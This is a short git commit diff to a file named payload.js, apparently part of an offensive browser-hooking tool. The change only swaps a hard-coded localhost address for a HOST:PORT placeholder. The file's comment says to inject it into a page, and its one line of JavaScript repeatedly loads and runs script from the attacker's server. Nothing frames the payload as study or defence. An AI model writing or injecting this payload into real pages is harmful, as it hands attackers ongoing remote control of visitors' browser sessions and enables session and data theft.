c21627c4501950726bad18bd3693f27e351caeee
AuroSaurus <aurosaurus@gmail.com>
2016-12-17 23:15:47 -0700

    Update payload.js

--- payload.js
+++ payload.js
@@ -1,2 +1,2 @@
-// Inject this into a page somehow.
-setInterval(function(){d=document;z=d.createElement("script");z.src="http://127.0.0.1:8888";d.body.appendChild(z)},9)
+// Inject this into a page somehow. Replace HOST:PORT with the host and port you're running the server on.
+setInterval(function(){d=document;z=d.createElement("script");z.src="http://HOST:PORT";d.body.appendChild(z)},9)
